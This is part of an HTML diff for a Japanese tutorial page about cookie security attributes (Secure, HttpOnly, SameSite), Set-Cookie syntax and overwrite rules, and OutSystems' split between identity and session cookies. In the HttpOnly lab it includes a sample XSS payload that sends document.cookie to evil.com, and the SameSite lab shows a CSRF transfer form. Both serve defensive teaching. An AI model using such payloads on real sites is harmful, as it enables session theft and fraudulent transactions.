+        <ul>
+          <li>DevTools の Application → Cookies で <code>Secure</code> 列にチェックがない認証Cookie</li>
+          <li>http:// でアクセスしてもCookieヘッダが送られている</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 07 ============ -->
+<div class="lab" id="lab7">
+  <div class="lab-header">
+    <div class="lab-num">07</div>
+    <h3>HttpOnly 属性 — JavaScriptアクセス禁止</h3>
+    <span class="lab-tag tag-intermediate">中級</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      <code>HttpOnly</code> 付きCookieは <code>document.cookie</code> から<strong>見えない・操作できない</strong>。XSS対策の基本。<strong>Cookie 1個ずつに指定</strong>する属性で、サイト全体やドメイン単位の設定ではない。
+    </p>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>HTTP — Cookie毎に個別指定</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: sessionId=abc; Path=/; HttpOnly         <span class="cm">// HttpOnly 付き</span>
+Set-Cookie: theme=dark; Path=/                       <span class="cm">// 付いていない</span>
+Set-Cookie: csrfToken=xyz; Path=/; HttpOnly         <span class="cm">// HttpOnly 付き</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>JavaScript — document.cookieの見え方</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cm">// 上記3つのCookieが設定されている状態で:</span>
+<span class="kw">console</span>.<span class="fn">log</span>(<span class="kw">document</span>.cookie);
+<span class="cm">// → "theme=dark"</span>
+<span class="cm">// sessionId と csrfToken は HttpOnly なので見えない！</span></pre>
+    </div>
+
+    <div class="beginner-box">
+      <div class="beginner-title">🔰 設計の考え方</div>
+<pre class="ascii-art">JavaScript で読み書きする必要があるか?
+    │
+    ├─ Yes（テーマ設定、UI状態など）
+    │     → HttpOnly 付けない
+    │
+    └─ No（認証トークン、セッションIDなど）
+          → HttpOnly 付ける（XSS対策）
+
+「JSから触りたいCookie」と「サーバだけが扱えばいい
+Cookie」を意識的に分けるのが基本姿勢</pre>
+    </div>
+
+    <div class="info-box err">
+      🚨 <strong>XSS攻撃シナリオ</strong>: 攻撃者が <code>&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;</code> を仕込んでも、<code>HttpOnly</code> のCookieは読めない。OutSystemsの <code>nr2Users</code> も <code>HttpOnly</code> で守られている。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 08 ============ -->
+<div class="lab" id="lab8">
+  <div class="lab-header">
+    <div class="lab-num">08</div>
+    <h3>SameSite 属性 — クロスサイト送信制御</h3>
+    <span class="lab-tag tag-intermediate">中級</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      他サイトからのリクエスト時にCookieを送るかどうかを制御。<strong>CSRF対策の要</strong>。現在のブラウザのデフォルトは <code>Lax</code>。
+    </p>
+
+    <table class="compare-table">
+      <thead><tr><th>値</th><th>同一サイト内</th><th>外部リンクGET</th><th>外部POST/iframe</th></tr></thead>
+      <tbody>
+        <tr><td>Strict</td><td class="yes">送信</td><td class="no">送信しない</td><td class="no">送信しない</td></tr>
+        <tr><td>Lax（デフォルト）</td><td class="yes">送信</td><td class="yes">送信</td><td class="no">送信しない</td></tr>
+        <tr><td>None</td><td class="yes">送信</td><td class="yes">送信</td><td class="yes">送信（要Secure）</td></tr>
+      </tbody>
+    </table>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>HTTP — CSRF攻撃のシナリオ</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cm">// ユーザは bank.com にログイン済み</span>
+<span class="cm">// Set-Cookie: token=xxx; SameSite=Lax; Secure; HttpOnly</span>
+
+<span class="cm">// 攻撃者の evil.com 上のフォーム</span>
+&lt;<span class="tag">form</span> <span class="attr">action</span>=<span class="val">"https://bank.com/transfer"</span> <span class="attr">method</span>=<span class="val">"POST"</span>&gt;
+  &lt;<span class="tag">input</span> <span class="attr">name</span>=<span class="val">"to"</span> <span class="attr">value</span>=<span class="val">"attacker"</span>&gt;
+  &lt;<span class="tag">input</span> <span class="attr">name</span>=<span class="val">"amount"</span> <span class="attr">value</span>=<span class="val">"1000000"</span>&gt;
+&lt;/<span class="tag">form</span>&gt;
+
+<span class="cm">// SameSite=Lax なら → Cookie 送信されず CSRF 失敗 ✓</span>
+<span class="cm">// SameSite=None なら → Cookie 送信され送金成立 ✗</span></pre>
+    </div>
+
+    <div class="info-box warn">
+      ⚠️ <code>SameSite=None</code> を使う場合は<strong>必ず <code>Secure</code> も必須</strong>（仕様上の要件）。サードパーティCookie（広告タグ・埋め込みウィジェット等）でのみ使う。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 09 ============ -->
+<div class="lab" id="lab9">
+  <div class="lab-header">
+    <div class="lab-num">09</div>
+    <h3>Set-Cookie / Cookie ヘッダの構文ルール</h3>
+    <span class="lab-tag tag-intermediate">中級</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      サーバ→ブラウザ（<code>Set-Cookie</code>）と、ブラウザ→サーバ（<code>Cookie</code>）で<strong>書き方が違う</strong>。1つの <code>Set-Cookie</code> ヘッダには<strong>1個のCookieしか書けない</strong>。
+    </p>
+
+    <table class="compare-table">
+      <thead><tr><th>方向</th><th>ヘッダ名</th><th>形式</th><th>属性</th></tr></thead>
+      <tbody>
+        <tr><td>サーバ→ブラウザ</td><td>Set-Cookie</td><td>複数行に分けて送る（1行1Cookie）</td><td>含む</td></tr>
+        <tr><td>ブラウザ→サーバ</td><td>Cookie</td><td>1行にセミコロン区切りで詰め込み</td><td>含まない</td></tr>
+      </tbody>
+    </table>
+
+    <div class="code-pair">
+      <div class="code-pair-col code-pair-before">
+        <div class="code-pair-label">✗ NG: 1行に複数Cookie</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>HTTP — 誤った書き方</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cm">// 1個のCookieとして解釈される</span>
+Set-Cookie: a=1; b=2
+
+<span class="cm">// 結果:</span>
+<span class="cm">//   Name=a, Value=1</span>
+<span class="cm">//   "b=2" は未知の属性 → 無視</span>
+<span class="cm">// b というCookieは作られない！</span></pre>
+        </div>
+      </div>
+      <div class="code-pair-col code-pair-after">
+        <div class="code-pair-label">✓ OK: 複数行に分ける</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>HTTP — 正しい書き方</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: a=1; Path=/; HttpOnly
+Set-Cookie: b=2; Path=/; HttpOnly
+
+<span class="cm">// 結果: 2個のCookieが正しく登録される</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>HTTP — 完全なやり取りの例</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cm">// [サーバ→ブラウザ] 複数行で発行（属性付き）</span>
+HTTP/1.1 200 OK
+Set-Cookie: osVisitor=v123; Path=/; Max-Age=31536000
+Set-Cookie: osVisit=s456; Path=/; HttpOnly
+Set-Cookie: nr2Users=auth789; Path=/; Secure; HttpOnly; SameSite=Lax
+
+<span class="cm">// [ブラウザ→サーバ] 1行に詰め込み（属性なし）</span>
+GET /Home HTTP/1.1
+Cookie: osVisitor=v123; osVisit=s456; nr2Users=auth789</pre>
+    </div>
+
+    <div class="info-box info">
+      📘 <strong>なぜ「1行1Cookie」か?</strong> <code>Expires</code> 属性の値に <code>Wed, 31 Dec 2026 23:59:59 GMT</code> のように<strong>カンマ・スペース・コロン</strong>が含まれるから。1行に複数許すとパースできなくなる。
+    </div>
+
+    <div class="info-box info">
+      📘 <strong>HTTP/2 以降</strong>: バイナリで <code>(name, value)</code> ペアを送るので改行は使わないが、「同じ name のフィールドを複数並べる」という構造で同じ意味になる。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 10 ============ -->
+<div class="lab" id="lab10">
+  <div class="lab-header">
+    <div class="lab-num">10</div>
+    <h3>複数行のSet-Cookieと「後勝ち」ルール</h3>
+    <span class="lab-tag tag-advanced">上級</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      ブラウザはCookieを <code>(Name, Domain, Path)</code> の3つ組をキーとして管理する。<strong>同じキーなら後勝ち（上書き）、違えば別物（両方保存）</strong>。
+    </p>
+
+    <table class="compare-table">
+      <thead><tr><th>状況</th><th>結果</th></tr></thead>
+      <tbody>
+        <tr><td>Name 同じ、Path 同じ、Domain 同じ</td><td class="yes">後勝ち（上書き）</td></tr>
+        <tr><td>Name 同じ、Path 違う</td><td class="no">別物（両方保存）</td></tr>
+        <tr><td>Name 同じ、Domain 違う</td><td class="no">別物（両方保存）</td></tr>
+        <tr><td>1個のSet-Cookie内に同属性を二重指定</td><td>後勝ち（推奨せず）</td></tr>
+      </tbody>
+    </table>
+
+    <div class="code-pair">
+      <div class="code-pair-col code-pair-before">
+        <div class="code-pair-label">単純な後勝ち</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>HTTP — 同じキーは上書き</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: theme=light; Path=/
+Set-Cookie: theme=dark; Path=/
+Set-Cookie: theme=auto; Path=/
+
+<span class="cm">// 結果: theme=auto だけ残る</span>
+<span class="cm">// (Name, Domain, Path) が同一</span></pre>
+        </div>
+      </div>
+      <div class="code-pair-col code-pair-after">
+        <div class="code-pair-label">⚠️ 落とし穴: Pathが違うと別物</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>HTTP — 両方残るケース</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: sessionId=AAA; Path=/
+Set-Cookie: sessionId=BBB; Path=/admin
+
+<span class="cm">// 結果: 両方残る（別物として扱われる）</span>
+<span class="cm">// /admin リクエスト時:</span>
+<span class="cm">// Cookie: sessionId=BBB; sessionId=AAA</span>
+<span class="cm">// → 同名が2個届いてバグの温床に</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="livedemo">
+      <div class="livedemo-bar">
+        <button class="toggle-btn" data-target="ld-overwrite">事故シナリオを見る</button>
+        <span class="toggle-label" id="ld-overwrite-label">現在: After（同じPath/Domainで一貫）</span>
+      </div>
+      <div class="livedemo-stage" id="ld-overwrite">
+        <div class="ld-panel good ld-after">
+          ✓ After: 発行も削除も Path=/ で統一<br>
+          → クリーンに上書き・削除できる
+        </div>
+        <div class="ld-panel bad ld-before">
+          ✗ Before: 発行 Path=/admin、削除 Path=/<br>
+          → 発行したCookieは残ったまま<br>
+          → 空Cookieが新規追加されて両方混在<br>
+          → 「ログアウトしたのにログイン状態が続く」事故
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box warn">
+      ⚠️ <strong>送信順序のルール（RFC 6265）</strong>: 複数マッチする場合、<strong>より具体的な Path のCookieが先</strong>に並ぶ。多くのフレームワークは「最初に出現した値」を採用するので、結果として具体的なPathが優先される。ただし実装依存なので注意。
+    </div>
+
+    <div class="info-box err">
+      🚨 <strong>削除の鉄則</strong>: 削除時は発行時とまったく同じ <code>Path</code>/<code>Domain</code> を指定すること。違うと削除されず、空Cookieが追加されるだけになる。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 11 ============ -->
+<div class="lab" id="lab11">
+  <div class="lab-header">
+    <div class="lab-num">11</div>
+    <h3>識別と認証の分離設計 — なぜ分けるのか</h3>
+    <span class="lab-tag tag-advanced">上級</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      OutSystemsが <code>osVisitor</code>（識別・永続）と <code>nr2Users</code>（認証・セッション）を分けているのは、<strong>「最小権限の原則」と「漏洩時の被害最小化」</strong>を実装したもの。情報セキュリティの基本原則 <em>defense in depth（多層防御）</em> をCookie層で実現している。
+    </p>
+
+    <div class="beginner-box">
+      <div class="beginner-title">🔰 価値と寿命の非対称設計</div>
+<pre class="ascii-art">                  ┌─── 永続層 (ディスク) ────┐
+                  │                          │
+   訪問者の識別 ─→│  osVisitor (1年)         │  ← 漏洩しても被害小
+                  │  nr1Users (Remember Me)  │  ← 識別のみ
+                  └──────────────────────────┘
+                                ↓ ↑
+                  ┌─── 揮発層 (メモリ) ──────┐
+                  │                          │
+   現在の認証   ─→│  osVisit                 │  ← ブラウザ閉じれば消滅
+                  │  nr2Users                │  ← HttpOnly+Secure
+                  │  (HttpOnly+Secure)       │  ← 漏洩窓を最小化
+                  └──────────────────────────┘
+
+「長期保持 = 価値が低い」「短期しか持たない = 価値が高い」
+攻撃者にとって美味しいCookieほど手に入れにくい設計</pre>
+    </div>
+
+    <h4 style="margin:18px 0 8px; color:var(--accent);">理由1: 漏洩時の被害範囲を限定</h4>
+
+    <div class="code-pair">
+      <div class="code-pair-col code-pair-before">
+        <div class="code-pair-label">✗ 悪い設計: 1つに詰め込む</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>悪例 — 認証も識別も1個に</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: userToken=xxx;
+  Max-Age=31536000;
+  HttpOnly; Secure
+
+<span class="cm">// 認証済み + 識別 + 1年間有効</span>
+<span class="cm">// 盗まれたら 1年間ずっと</span>
+<span class="cm">// 「ログイン済みのそのユーザ」として悪用可能</span></pre>
+        </div>
+      </div>
+      <div class="code-pair-col code-pair-after">
+        <div class="code-pair-label">✓ 良い設計: 役割で分離</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>OutSystems 流 — 分離設計</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: osVisitor=xxx;
+  Max-Age=31536000        <span class="cm">// 識別だけ</span>
+Set-Cookie: nr2Users=yyy;
+  HttpOnly; Secure        <span class="cm">// 認証/セッション</span>
+
+<span class="cm">// nr2Users 盗難 → ブラウザ閉じれば失効</span>
+<span class="cm">// osVisitor 盗難 → ログインに使えない</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <h4 style="margin:18px 0 8px; color:var(--accent);">理由2: 寿命の要求が真逆</h4>
+
+    <table class="compare-table">
+      <thead><tr><th>項目</th><th>識別用 (osVisitor)</th><th>認証用 (nr2Users)</th></tr></thead>
+      <tbody>
+        <tr><td>目的</td><td>同じ人だと分かる</td><td>ログイン状態を保つ</td></tr>
+        <tr><td>必要な寿命</td><td>長いほど良い（再訪追跡・分析）</td><td>短いほど安全（席を立った隙の悪用防止）</td></tr>
+        <tr><td>漏洩時のリスク</td><td class="yes">低</td><td class="no">高</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box info">
+      📘 1個にまとめると「長く保ちたい」と「短く切りたい」という<strong>矛盾する要求</strong>を1つのCookieに押し込むことになり、どっちつかずになる。分離すれば、それぞれの要件を最適に満たせる。
+    </div>
+
+    <h4 style="margin:18px 0 8px; color:var(--accent);">理由3: 機能ごとに独立制御</h4>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>運用シナリオ — 部分操作が可能</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cm">// [ログアウト処理]</span>
+nr2Users を削除   → 認証は切れる
+osVisitor は残す  → 「ログアウト後の同じ訪問者」として行動分析できる
+
+<span class="cm">// [セッションタイムアウト]</span>
+nr2Users だけ失効 → 再ログインを要求
+osVisitor は維持  → ユーザ体験は途切れない (カート復元、最近見た商品など)
+
+<span class="cm">// ["ログイン状態を保持"のON/OFF]</span>
+nr1Users (永続認証) を発行する/しない だけで切替
+他のCookieには影響しない</pre>
+    </div>
+
+    <h4 style="margin:18px 0 8px; color:var(--accent);">理由4: 属性を最適化できる</h4>
+
+    <table class="compare-table">
+      <thead><tr><th>Cookie</th><th>HttpOnly</th><th>Secure</th><th>SameSite</th><th>寿命</th></tr></thead>
+      <tbody>
+        <tr><td>osVisitor（識別）</td><td>任意</td><td>推奨</td><td>Lax</td><td>1年</td></tr>
+        <tr><td>nr2Users（認証）</td><td class="yes">必須</td><td class="yes">必須</td><td class="yes">Lax/Strict</td><td>セッション</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box ok">
+      ✅ <strong>まとめ</strong>: セキュリティ設計でよく使われる <em>defense in depth</em>（多層防御）の考え方を、Cookieという1つのレイヤの中でも実現している。役割ごとに分離して守りを重ねる、という発想。OutSystemsの認証Cookie設計は、この原則に忠実に従っている。
+    </div>
+  </div>
+</div>
+
+</div>
+
+<script>
+function copyCode(btn) {
+  const block = btn.closest('.code-block') || btn.parentElement;
+  const pre = block.querySelector('pre');
+  if (!pre) return;
+  navigator.clipboard.writeText(pre.innerText).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+
+const LAB_META = {
+  lab0: {
+    check: [
+      '①ブラウザのDevTools (Application → Cookies) を開き、訪問サイトのCookie一覧を確認する',
+      '②各Cookieの Name / Value / Domain / Path / Expires / HttpOnly / Secure 列を見比べる',
+      '③Expires列が「Session」のものと日時のものを探し、ブラウザ再起動時の挙動を予測する'
+    ]
+  },
+  lab1: {
+    check: [
+      '①ログイン後にDevToolsでセッションCookie（Expires=Session）を確認',
+      '②ブラウザを完全終了→再起動して、同じCookieが残っているか確認',
+      '③「ログイン状態を保持」チェックの有無で永続Cookie（nr1Users 等）の有無が変わるか比較'
+    ]
+  },
+  lab2: {
+    check: [
+      '①OutSystemsアプリにアクセスし、osVisitor / osVisit / nr2Users 等のCookieが発行されているか確認',
+      '②ブラウザ再起動後 osVisitor だけが残ることを確認（osVisit / nr2Users は消える）',
+      '③ログアウト操作で nr2Users が削除されるが osVisitor は残ることを観察'
+    ]
+  },
+  lab3: {
+    check: [
+      '①Path=/ のCookie（OutSystemsの標準設定）が、配下のすべてのページで送られるか観察',
+      '②複数アプリを同じドメインに配置している環境で、各アプリに別のCookieが発行されていないか確認',
+      '③DevToolsの Application → Cookies で各CookieのPath列を比較'
+    ]
+  },
+  lab4: {
+    check: [
+      '①メインドメインとサブドメインで、Domain属性のあるCookie・ないCookieの送信範囲を観察',
+      '②Network タブで両方のドメインへのリクエストヘッダの Cookie 内容を比較',
+      '③Domain属性なしで発行されたCookieが、サブドメインには送られないことを確認'
+    ]
+  },
+  lab5: {
+    check: [
+      '①Expires と Max-Age 両方付いたCookieが Application → Cookies でどう表示されるか確認',
+      '②Max-Age=0 を発行する処理（ログアウト等）の前後で該当Cookieが消えるか観察',
+      '③発行時と削除時で Path/Domain が違うとCookieが残ったままになる事故を再現'
+    ]
+  },
+  lab6: {
+    check: [
+      '①本番環境のログインCookieが Secure 属性付きか DevTools で確認',
+      '②http:// でアクセス可能な開発環境で、Cookieヘッダが送られるか比較（送られていれば Secure なし）',
+      '③Application → Cookies の Secure 列にチェックが入っているCookieを認証関連で確認'
+    ]
+  },
+  lab7: {
+    check: [
+      '①F12を開かずブラウザのアドレスバーで javascript:alert(document.cookie) を実行（一部ブラウザはブロック）',
+      '②または Application → Cookies で HttpOnly 列にチェックがあるCookieを特定',
+      '③そのCookieが document.cookie で取得できないことを別ブラウザでも確認'
+    ]
+  },
+  lab8: {
+    check: [
+      '①Application → Cookies の SameSite 列で各Cookieの設定を確認',
+      '②外部サイトから target サイトへリンクをクリック→Network で Cookie が送信されているか確認',
+      '③外部サイトの form/iframe からのPOSTリクエスト時に Cookie が送られるか観察（SameSite=Lax の挙動確認）'
+    ]
+  },
+  lab9: {
+    check: [
+      '①DevTools の Network タブで、ログイン直後のレスポンスヘッダを確認',
+      '②Set-Cookie が複数行に分かれて並んでいることを確認（HTTP/1.1 の場合）',
+      '③次のリクエストの Cookie ヘッダが1行にセミコロン区切りで詰め込まれていることを確認'
+    ]
+  },
+  lab10: {
+    check: [
+      '①Application → Cookies で同じ Name のCookieが複数行ある場合、Path列・Domain列を比較',
+      '②サブパス（/admin等）と /  の両方でログインを試し、Cookieがどう積み重なるか観察',
+      '③ログアウト処理後に DevTools で該当Cookieが残っていないか確認（残っていればPath/Domain不一致の可能性）'
+    ]
+  },
+  lab11: {
+    check: [
+      '①OutSystemsアプリでログイン→ログアウトを行い、osVisitor が残り nr2Users が消えることを確認',
+      '②ブラウザ再起動後、osVisitor は残るが nr2Users は消えていることを確認',
+      '③「ログイン状態を保持」ON/OFFで nr1Users の発行有無が変わることを観察'
+    ]
+  }
+};
+
+function infoHTML(m){ return m?.info ? `<div class="info-box ${m.info.type||'info'}">${m.info.html}</div>` : ''; }
+function verifyHTML(m){ if (!m?.verify) return '';
+  const {before, after} = m.verify;
+  return `<div class="verify">
+    <div class="verify-col verify-before"><div class="verify-label">Before ▶︎ 実行前</div>${before||''}</div>
+    <div class="verify-col verify-after"><div class="verify-label">After ▶︎ 実行後</div>${after||''}</div>
+  </div>`; }
+function checkHTML(m){ if (!m?.check?.length) return '';
+  return `<div class="check-steps">
+    <div class="check-steps-title">🔍 ブラウザ実機チェック</div>
+    <ol>${m.check.map(s=>`<li>${s}</li>`).join('')}</ol>
+  </div>`; }
+function tryHTML(m){
+  const tip = m?.try ? `<div class="try-tip"><strong>💡 このラボのコツ:</strong> ${m.try}</div>` : '';
+  return `<div class="try-box">
+    <div class="try-title">💻 試し方ガイド</div>
+    <ol>
+      <li>ブラウザで任意のサイト（OutSystems環境推奨）を開く</li>
+      <li><strong>F12</strong> または右クリック→検証で DevTools を開く</li>
+      <li><strong>Application</strong> タブ → <strong>Storage</strong> → <strong>Cookies</strong> でCookie一覧を表示</li>
+      <li>下の「🔍 ブラウザ実機チェック」を順に試す</li>
+    </ol>
+    ${tip}
+  </div>`;
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.querySelectorAll('.lab').forEach(lab => {
+    const meta = LAB_META[lab.id]; const body = lab.querySelector('.lab-body');
+    if (!body || !meta) return;
+    const frag = document.createElement('div');
+    frag.innerHTML = infoHTML(meta) + verifyHTML(meta) + tryHTML(meta) + checkHTML(meta);
+    while (frag.firstChild) body.appendChild(frag.firstChild);
+  });
+
+  const links = Array.from(document.querySelectorAll('#sidebar .nav-item'));
+  const map = new Map();
+  links.forEach(a => { const el = document.getElementById(a.getAttribute('href').slice(1)); if (el) map.set(el, a); });
+  const io = new IntersectionObserver(es => es.forEach(e => {
+    if (e.isIntersecting) { const l = map.get(e.target);
+      if (l) { links.forEach(n=>n.classList.remove('active')); l.classList.add('active'); } }
+  }), { rootMargin:'-30% 0px -60% 0px' });
+  document.querySelectorAll('.lab[id]').forEach(lab => io.observe(lab));
+});
+
+document.addEventListener('click', (e) => {
+  if (!e.target.matches('.toggle-btn')) return;
+  const btn = e.target;
+  const stage = document.getElementById(btn.dataset.target);
+  if (!stage) return;
+  const isBefore = stage.classList.toggle('is-before');
+  btn.classList.toggle('is-before', isBefore);
+  const label = document.getElementById(btn.dataset.target + '-label');
+  if (label) label.textContent = isBefore ? '現在: Before（問題のある実装）' : '現在: After（推奨実装）';
+});
+</script>
+
+</body>
+</html>
